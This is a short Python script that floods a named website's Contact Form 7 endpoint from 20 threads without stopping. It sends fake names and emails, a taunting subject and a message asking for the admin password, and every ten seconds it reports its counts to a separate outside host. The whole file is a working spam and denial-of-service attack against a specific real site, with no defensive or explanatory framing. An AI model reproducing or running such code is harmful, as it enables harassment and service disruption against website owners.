import requests
import random
import json
import threading
import signal
import sys
import time

url = 'https://stand4change.co/wp-json/contact-form-7/v1/contact-forms/7/feedback'

names = json.loads(open('names.json').read())

threads = 20

sentTotal = 0
failedTotal = 0

sentPer = 0
failedPer = 0


def worker():
	global sentTotal
	global failedTotal

	global sentPer
	global failedPer
	
	while 1:
		name = names[random.randrange(0,len(names) - 1)]

		email = name.lower() + str(random.randrange(10,1000)) + '@npctom.com'

		req = requests.post(url, allow_redirects=False, data={

			'_wpcf7': '7',
			'_wpcf7_version': '5.4.1',
			'_wpcf7_locale': 'en_US',
			'_wpcf7_unit_tag': 'wpcf7-f7-p78-o1',
			'_wpcf7_container_post': '78',
			'_wpcf7_posted_data_hash': '',
			'your-name': name,
			'your-email': email,
			'your-subject': 'tom was here',
			'your-message': 'i want to do some maitinance for ur site. give me admin password'

			# 'InputName': name,
			# 'InputEmail': email,
			# 'InputSubject': 'Hi Tom. I want a website',
			# 'InputMessage': 'sorry tom but i had to. From ' + email
		})

		if req.status_code == 200:
			sentTotal += 1
			sentPer += 1
		else:
			failedTotal += 1
			failedPer += 1

		# print('name: %s \t and email %s \t req= %s' % (name, email, req.status_code))
		print('req= %s\tsent= %i\tfailed= %i\tid= %s' % (req.status_code, sentTotal, failedTotal, str(threading.current_thread().name)))
		# print(req.text)


for i in range(threads):
    t = threading.Thread(target=worker)
    t.start()

while 1:
	time.sleep(10)
	api = requests.post('https://tom.dcralph.com', allow_redirects=False, data={'sent': sentPer, 'failed': failedPer})
	print(api.status_code)
	sentPer = 0
	failedPer = 0
